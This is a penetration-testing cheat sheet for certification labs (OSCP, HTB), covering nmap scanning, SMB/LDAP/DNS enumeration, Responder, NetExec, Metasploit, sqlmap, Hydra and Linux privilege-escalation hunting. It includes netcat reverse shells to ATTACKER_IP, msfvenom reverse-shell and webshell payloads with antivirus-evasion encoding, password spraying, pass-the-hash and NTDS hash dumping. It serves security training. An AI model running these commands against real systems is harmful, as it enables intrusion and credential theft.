Reconnaissance & Enumeration

Nmap

Network Mapper — the de-facto standard for host discovery, port scanning, service version detection, and OS fingerprinting.
OSCPHTBCPTSPNPT
Syntax
Command Format
nmap [Scan Type] [Options] <target>
💡Start every engagement with -sC -sV -oA for comprehensive output saved to all formats simultaneously.
Basic Scans
Quick TCP Scan
nmap 10.10.10.10
Default SYN scan on top 1000 TCP ports. Requires root privileges for raw packet injection.
Full Port Scan
nmap -p- 10.10.10.10
Scans all 65535 TCP ports. Essential for finding non-standard services. Slow — use --min-rate 5000 to speed up.
UDP Scan
nmap -sU 10.10.10.10
UDP scan on top 1000 ports. Slow and unreliable by nature. Use -sU -sV for version detection. Critical for finding SNMP (161), DNS (53), TFTP.
Host Discovery
nmap -sn 10.10.10.0/24
Ping sweep without port scanning. Quickly discovers live hosts in a subnet. Use -sn -PE to force ICMP echo.
Practical Pentesting Commands
⭐ HTB/OSCP Go-To Initial Scan
nmap -sC -sV -oA initial 10.10.10.10
Default scripts + version detection + all-format output. Creates initial.nmap, initial.gnmap, initial.xml. Most common first scan on any target.
Fast Full Scan
nmap -p- --min-rate 5000 -sV -sC -oA full 10.10.10.10
All ports at 5000 packets/sec minimum. Run after initial scan to catch services on non-standard ports. --min-rate can cause missed ports on unstable networks.
Targeted Port Scan
nmap -sC -sV -p 22,80,443,8080,8443 -oA targeted 10.10.10.10
Run after finding open ports — go deep on specific services. Combine with specific NSE scripts per service.
Vuln Scan (Web)
nmap -sV --script=vuln -p 80,443 10.10.10.10
Runs all NSE vulnerability scripts. Noisy — avoid on stealth engagements. Good for lab environments.
Skip Ping (Firewalled Host)
nmap -Pn -sV -sC -oA noping 10.10.10.10
Treats host as up even if it doesn't respond to ping. Essential for Windows hosts and firewalled machines that block ICMP.
SMB Vulnerabilities
nmap --script smb-vuln* -p 139,445 10.10.10.10
Checks for EternalBlue (MS17-010), MS08-067, and other critical SMB vulnerabilities. High value target in AD environments.
Flag Reference

Standard HTB/OSCP Workflow
1
Quick initial scan
nmap -sC -sV -oA initial 10.10.10.10
Get running services fast. Review output while full scan runs.
2
Full port scan in background
nmap -p- --min-rate 5000 -oA allports 10.10.10.10 &
Find anything on non-standard ports. Run concurrently with other tasks.
3
Deep scan on found ports
nmap -sC -sV -p 22,80,8080 -oA targeted 10.10.10.10
Run scripts and version detection only on confirmed open ports.
4
UDP scan (if needed)
nmap -sU --top-ports 20 -oA udp 10.10.10.10
Check for SNMP, TFTP, NFS. Often reveals additional attack surface.
⚠️Common Mistakes: Forgetting -Pn on Windows hosts (ICMP blocked by default). Not saving output with -oA. Running -p- without --min-rate causing multi-hour scans. Using -T5 on unstable networks causing missed ports.

Netcat (nc)

The "TCP/IP Swiss Army knife" — reads and writes data across network connections. Essential for shells, port scanning, file transfer, and pivoting.
OSCPHTB
Listeners & Reverse Shells
⭐ Reverse Shell Listener
nc -lvnp 4444
Start listener on port 4444. -l listen, -v verbose, -n no DNS, -p port. Your go-to for catching reverse shells.
Reverse Shell (Linux Target)
nc -e /bin/bash ATTACKER_IP 4444
Execute bash and pipe it to attacker. Requires -e flag support (OpenBSD nc doesn't have it — use mkfifo method).
mkfifo Reverse Shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
Works on all nc versions. Creates a named pipe (FIFO) to simulate bidirectional communication.
Banner Grab / Connect
nc -nv 10.10.10.10 80
Connect to port 80. Type HTTP requests manually: GET / HTTP/1.1. Good for banner grabbing on any TCP service.
File Transfer
File Transfer
# Receiver: nc -lvnp 4444 > received_file # Sender: nc -nv RECEIVER_IP 4444 < file_to_send
Simple file transfer. No encryption. Good for moving tools to compromised machines without SCP.
💡After catching a shell, upgrade to a PTY: python3 -c 'import pty;pty.spawn("/bin/bash")' then Ctrl+Z → stty raw -echo; fg → export TERM=xterm

Gobuster

Directory/file brute-forcer and DNS subdomain enumerator written in Go. Fast multi-threaded scanning.
OSCPHTBCPTS
Directory Enumeration
Standard Dir Scan
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Bread-and-butter directory enumeration. The medium wordlist is a good balance of coverage vs speed.
⭐ Full Dir Scan + Extensions
gobuster dir -u http://10.10.10.10 \ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \ -x php,html,txt,bak -t 50 -o gobuster.txt
Extension fuzzing is critical — finds config.php.bak, admin.html, backup files. Adjust extensions based on tech stack.
DNS Subdomain Enum
gobuster dns -d target.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
Finds subdomains via DNS resolution. Add discovered subdomains to /etc/hosts for virtual host routing.
Virtual Host Enum
gobuster vhost -u http://10.10.10.10 \ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \ --append-domain -t 50
Enumerates virtual hosts by manipulating the Host header. Different from DNS — finds vhosts that share an IP. Essential for multi-tenant web servers.

ffuf

Fuzz Faster U Fool — blazing fast web fuzzer for directories, parameters, virtual hosts, and POST body fuzzing.
HTBCPTSOSCP
Core Usage
Basic Dir Fuzz
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
FUZZ is the injection keyword. Place it anywhere in the URL, header, or body.
⭐ Full Web Fuzz
ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt \ -e .php,.html,.txt -fc 404 -t 100 -o ffuf.json
Extensions + filter 404s + 100 threads + JSON output. Tune with -fs (filter size) and -fw (filter words) to remove false positives.
VHost Fuzzing
ffuf -u http://10.10.10.10 -H 'Host: FUZZ.target.htb' \ -w subdomains.txt -fs 4242
Fuzz the Host header for virtual hosting. Filter by size (-fs) — do a test request first to get the default response size.
LFI Parameter Fuzz
ffuf -u 'http://10.10.10.10/page?param=FUZZ' \ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 4242
Fuzz GET parameter values for LFI. Use SecLists LFI wordlists for comprehensive path traversal payloads.
POST Body Fuzz (Login)
ffuf -u http://10.10.10.10/login -X POST \ -d 'user=admin&pass=FUZZ' -w passwords.txt -fc 302
Bruteforce login form. Use -fc 302 to filter redirects (successful login often redirects). Add -H 'Content-Type: application/x-www-form-urlencoded'.
FlagMeaning
-fcFilter HTTP status codes
-fsFilter response size (bytes)
-fwFilter by word count
-flFilter by line count
-mcMatch status codes (default all)
-msMatch response size
-tThreads (default 40)
-rateMax requests per second
-eExtension list (comma separated)
-recursionEnable recursive fuzzing
-vVerbose (show full URL)

SMB Enumeration

Enumerate SMB shares, users, and policies using smbclient, smbmap, enum4linux-ng, and rpcclient.
OSCPHTBCPTS
smbclient
⭐ List Shares (Null Session)
smbclient -L //10.10.10.10 -N
List available SMB shares with null authentication (-N). First step on any Windows target with port 445 open.
Connect to Share
smbclient //10.10.10.10/share -N
Connect to a specific share with null auth. Once connected: ls, get filename, recurse ON; prompt OFF; mget *
Connect with Creds
smbclient //10.10.10.10/share -U 'domain\user%password'
Authenticate with domain credentials. Format: DOMAIN\user%password or just user%password for local.
smbmap
Null Session Share Enum
smbmap -H 10.10.10.10
Shows shares + read/write permissions. Better than smbclient -L for permission visibility.
⭐ Recursive Share List
smbmap -H 10.10.10.10 -u user -p password -R sharename
Recursively list all files in a share. Excellent for finding credentials, config files, juicy documents.
enum4linux-ng
⭐ Full Enumeration
enum4linux-ng -A 10.10.10.10
Complete enumeration: users, shares, groups, password policy, OS info. The -ng version is rewritten in Python, more reliable.
Authenticated Enum
enum4linux-ng -u user -p pass -A 10.10.10.10 -oY enum4linux.yaml
With credentials, retrieves far more data: full user list, RID cycling, additional shares. Save as YAML for parsing.
rpcclient
Null Session RPC
rpcclient -U '' -N 10.10.10.10 # Then run: enumdomusers # List domain users enumdomgroups # List groups querydominfo # Domain info lookupnames guest # Lookup specific user getdompwinfo # Password policy
Interactive RPC client. Powerful for manual AD enumeration when automated tools fail.

LDAP Enumeration

Query Active Directory domain controllers via LDAP (port 389/636) to extract users, groups, GPOs, and other domain objects.
CPTSHTB
Anonymous LDAP Dump
ldapsearch -x -H ldap://10.10.10.10 -b 'DC=domain,DC=htb'
-x simple auth, -H LDAP URI, -b base DN. Anonymous bind may be allowed — dump everything first.
⭐ User Enumeration (Auth)
ldapsearch -x -H ldap://10.10.10.10 \ -D 'user@domain.htb' -w 'password' \ -b 'DC=domain,DC=htb' '(objectClass=user)' \ sAMAccountName mail
Filter for user objects, return only username and email attributes. Pipe to grep sAMAccountName for clean user list.
Find Kerberoastable Users
ldapsearch -x -H ldap://10.10.10.10 \ -D 'user@domain.htb' -w 'password' \ -b 'DC=domain,DC=htb' \ '(servicePrincipalName=*)' \ sAMAccountName servicePrincipalName
Find accounts with SPNs set — these are Kerberoastable. Alternative to Impacket's GetUserSPNs.py.

SNMP Enumeration

Simple Network Management Protocol — often misconfigured with default community strings, leaking system info, users, and network topology.
OSCPHTB
⭐ Community String Brute
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.10
Brute-force community strings. Start here before snmpwalk. Default strings: public, private, manager.
Full MIB Walk
snmpwalk -c public -v2c 10.10.10.10
Walk the entire MIB tree with community string public. Can reveal: usernames, running processes, installed software, network interfaces, TCP connections.
Windows Users via SNMP
snmpwalk -c public -v2c 10.10.10.10 1.3.6.1.4.1.77.1.2.25
Enumerate Windows user accounts. OID 1.3.6.1.2.1.25.4.2.1.2 = running processes. 1.3.6.1.2.1.6.13.1.3 = TCP ports.

DNS Enumeration

Enumerate DNS records using dnsrecon, dnsenum, dig, and host to discover subdomains, mail servers, zone transfers, and more.
OSCPHTB
Standard DNS Enum
dnsrecon -d target.htb -t std
Standard enumeration: SOA, NS, A, AAAA, MX, SRV records. Good starting point for any DNS assessment.
Zone Transfer Attempt
dnsrecon -d target.htb -t axfr
Attempt AXFR zone transfer from all NS servers. Misconfigured DNS servers reveal entire zone — gold mine of subdomains and IPs.
Subdomain Brute
dnsrecon -d target.htb -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt
Brute-force subdomains using wordlist. Reveals hidden infrastructure: dev, staging, internal, api subdomains.
dig Zone Transfer
dig axfr @10.10.10.10 target.htb
Manual AXFR request directly to DNS server. More control than dnsrecon. Works in CTFs where DNS server is the target.
Quick DNS Lookups
host -t mx target.htb # Mail servers host -t ns target.htb # Name servers host target.htb # A record (IP)
Quick single-record lookups. Faster than dig for simple queries. Good for quick enumeration script integration.

Responder

Poison LLMNR, NBT-NS, and MDNS queries to capture NTLMv1/v2 hashes from Windows machines on the local network.
CPTSHTBPNPT
⚠️Responder only works on the local network segment. Must be run as root. Do NOT run on production networks without explicit permission — it disrupts legitimate traffic.
⭐ Start Responder
sudo responder -I eth0 -wv
Start poisoning on eth0. -w WPAD proxy server, -v verbose. Hashes saved to /usr/share/responder/logs/. Then crack with hashcat mode 5600.
Analyze Mode (Passive)
sudo responder -I eth0 -A
Analyze mode — listen only, no poisoning. Use to assess what LLMNR/NBT-NS traffic exists before poisoning. Safer for initial recon.
Crack NTLMv2 Hashes
hashcat -m 5600 ntlmv2.hash \ /usr/share/wordlists/rockyou.txt \ -r /usr/share/hashcat/rules/best64.rule
Mode 5600 = NTLMv2. Use rules to increase coverage. If cracking fails, consider relay attack instead.

NetExec / CrackMapExec

Swiss army knife for network and Active Directory pentesting. Enumerate, spray credentials, execute commands, and dump secrets across SMB, WinRM, LDAP, SSH, and more.
CPTSHTBPNPT
ℹ️NetExec (nxc) is the actively maintained fork of CrackMapExec (cme). Commands are interchangeable — substitute nxc for cme in all commands.
SMB Enumeration
Subnet SMB Sweep
nxc smb 10.10.10.0/24
Discovers Windows hosts, shows hostname, domain, OS version, SMB signing. Essential for internal network enumeration.
List Shares
nxc smb 10.10.10.10 -u user -p password --shares
List accessible shares with READ/WRITE permissions. Look for non-default shares that might contain sensitive data.
Enumerate Users
nxc smb 10.10.10.10 -u user -p password --users
Dumps all domain users via RPC. Fast alternative to ldapsearch for user enumeration.
Password Policy
nxc smb 10.10.10.10 -u user -p password --pass-pol
Retrieve password policy before spraying! Know the lockout threshold (typically 5 bad attempts) to avoid locking accounts.
Credential Testing & Spraying
⭐ Password Spray
nxc smb 10.10.10.10 \ -u users.txt -p 'Password123!' \ --continue-on-success
One password against many users. ALWAYS check password policy first. [+] = valid, Pwn3d! = admin. Wait 30+ min between sprays.
⭐ Pass-The-Hash (Network)
nxc smb 10.10.10.0/24 \ -u administrator \ -H 'aad3b435b51404eeaad3b435b51404ee:NTHASH' \ --local-auth
Test local admin NTLM hash across entire subnet. --local-auth for local accounts. Identifies password re-use — lateral movement gold.
Remote Execution & Secrets
Command Execution
nxc smb 10.10.10.10 -u user -p password -x 'whoami /all'
Execute command via SMBExec. Requires admin privileges. Use -X for PowerShell. Great for command execution without full shell.
Dump SAM Hashes
nxc smb 10.10.10.10 -u user -p password --sam
Dump local SAM database — local account NTLM hashes. Requires local admin. Test hashes with PTH for lateral movement.
Dump NTDS (Domain Admin)
nxc smb 10.10.10.10 -u user -p password --ntds
Dump NTDS.dit from DC — ALL domain password hashes. Requires Domain Admin. Use after DCSync or DC compromise.

Metasploit Framework

The world's most widely used penetration testing framework. Exploits, payloads, post-exploitation, and auxiliary modules in one platform.
OSCPHTBCPTS
⚠️OSCP allows Metasploit on only ONE machine. Learn manual exploitation techniques for every module you use. msfvenom is unlimited — only msfconsole's exploit modules are restricted.
Core Commands
⭐ Basic MSF Workflow
msfconsole search type:exploit name:ms17_010 use exploit/windows/smb/ms17_010_eternalblue show options set RHOSTS 10.10.10.10 set LHOST 10.10.14.1 run
Standard workflow: search → use → configure → run. Always check show options for required settings. check tests vulnerability without exploiting.
Multi/Handler (Catch Shells)
use multi/handler set payload windows/x64/meterpreter/reverse_tcp set LHOST 10.10.14.1 set LPORT 4444 run -j
Catch meterpreter sessions. -j runs as background job. Essential companion to msfvenom-generated payloads. Match payload exactly.
msfvenom Payload Generation
Windows EXE Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \ LHOST=10.10.14.1 LPORT=4444 \ -f exe -o shell.exe
Standard Windows meterpreter. Upload and execute on target. AV will catch this — use -e x86/shikata_ga_nai -i 5 for basic encoding.
Linux ELF Payload
msfvenom -p linux/x64/meterpreter/reverse_tcp \ LHOST=10.10.14.1 LPORT=4444 \ -f elf -o shell.elf
Linux meterpreter. After transfer: chmod +x shell.elf && ./shell.elf. Use linux/x64/shell_reverse_tcp for staged-free version.
PHP Webshell
msfvenom -p php/meterpreter_reverse_tcp \ LHOST=10.10.14.1 LPORT=4444 \ -f raw -o shell.php
PHP payload for file upload vulnerabilities or CMS exploitation. Remove <?php wrapper if added twice. Pair with multi/handler php payload.
ASPX Shell (IIS)
msfvenom -p windows/x64/shell_reverse_tcp \ LHOST=10.10.14.1 LPORT=4444 \ -f aspx -o shell.aspx
ASPX shell for IIS servers. Upload to writable IIS directory. Navigate to shell URL in browser to trigger. Check shell_reverse_tcp vs meterpreter based on OSCP limits.

SQLMap

Automated SQL injection detection and exploitation. Supports MySQL, MSSQL, Oracle, PostgreSQL, SQLite, and more.
OSCPHTBCPTS
Basic GET Injection
sqlmap -u 'http://10.10.10.10/page?id=1' --batch
--batch accepts all defaults automatically. Tests the id parameter for all injection types. First step when you suspect SQLi.
⭐ Enumerate Databases
sqlmap -u 'http://10.10.10.10/page?id=1' --dbs --batch # Then get tables: sqlmap -u '...' -D dbname --tables --batch # Then dump: sqlmap -u '...' -D dbname -T users --dump --batch
Progressive enumeration: databases → tables → dump data. Always save results with --output-dir.
Burp Request File
sqlmap -r request.txt --batch --level=5 --risk=3
Save request from Burp (Right-click → Save item), feed to sqlmap. --level 5 --risk 3 for thorough testing. Mark injection point with * in request file.
OS Shell via SQLi
sqlmap -u 'http://10.10.10.10/page?id=1' --os-shell --batch
Attempt OS command execution. Works best with MSSQL (xp_cmdshell) or MySQL with FILE privilege. --sql-shell for interactive SQL.
POST Form Injection
sqlmap -u 'http://10.10.10.10/login' \ --data='user=admin&pass=test' --batch
Test POST parameters. Add -p user to test specific parameter. Add cookies with --cookie='session=abc' for authenticated testing.

Exploitation & Password Attacks

Hydra

Fast and flexible online password brute-forcing tool supporting 50+ protocols including SSH, FTP, HTTP, SMB, RDP, and more.
OSCPHTB
SSH Brute Force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
-l single username, -P password list. Use -L for username list. SSH may throttle — add -t 4 to limit threads.
⭐ HTTP POST Form Brute
hydra -l admin -P rockyou.txt 10.10.10.10 \ http-post-form \ '/login:user=^USER^&pass=^PASS^:Invalid credentials' \ -t 30
Format: /path:POST_data:failure_string. The failure string must match text from a FAILED login response. Use Burp to capture the exact POST data.
SMB Spray
hydra -L users.txt -P passwords.txt 10.10.10.10 smb -t 1 -W 5
SMB spray. -t 1 single thread (avoids lockout), -W 5 wait 5s between attempts. Check domain password policy first!
FTP Brute Force
hydra -l user -P rockyou.txt ftp://10.10.10.10 -t 20 -V
FTP brute force. -V verbose — shows each attempt. Hydra also supports: rdp, vnc, telnet, mysql, mssql, postgresql, ldap, smtp, pop3, imap.

Linux Post-Exploitation Essentials

Essential Linux commands for post-exploitation: finding sensitive files, SUID binaries, writable directories, and credential hunting.
OSCPHTB
find — Privilege Escalation Hunting
⭐ Find SUID Binaries
find / -perm -u=s -type f 2>/dev/null
Find all SUID binaries. Cross-reference with GTFOBins for exploitation. Common privesc vectors: python, perl, find, nano, vim, bash.
Find Writable Dirs
find / -writable -type d 2>/dev/null
Find world-writable directories. Check for cron-executed scripts in writable paths — classic privesc.
Find Sensitive Files
find / -name '*.conf' -o -name '*.config' \ -o -name 'id_rsa' -o -name '*.key' 2>/dev/null
Hunt for config files and SSH keys. Always check /home/*/, /var/www/html/, /etc/, /opt/.
SUID Root Files (Detailed)
find / -user root -perm -4000 2>/dev/null | xargs ls -la
Same as SUID search but with file details. Pipe to grep -v /usr/bin to filter common system binaries and focus on unusual ones.
grep — Credential Hunting
Password Hunt in Web Files
grep -ri 'password' /var/www/html/ 2>/dev/null grep -ri 'db_pass\|DB_PASS\|passwd\|secret' /var/www/html/
Hunt for hardcoded credentials in web application files. Common in PHP config files: db_password, mysql_password.
System Credential Hunt
grep -ri 'password' /home/ /root/ /etc/ 2>/dev/null | grep -v 'Binary file'
Check home directories, root, and system configs. Look for plaintext passwords in bash_history, .ssh/config, .netrc files.
Useful Shell Commands
List Real Users
cat /etc/passwd | awk -F: '$3 >= 1000 {print $1}'
Filter real user accounts (UID ≥ 1000). Check their home directories for credentials, keys, interesting files.
Enumerate Cron Jobs
crontab -l cat /etc/cron* ls -la /var/spool/cron/ cat /etc/crontab
Check all cron jobs. Look for scripts running as root that are writable. Classic privesc: writable script called by root cron.
⭐ Check Sudo Rights
sudo -l
First command after getting a shell! Shows what you can run as root. Check GTFOBins for any listed binary. (ALL) NOPASSWD is instant privesc.
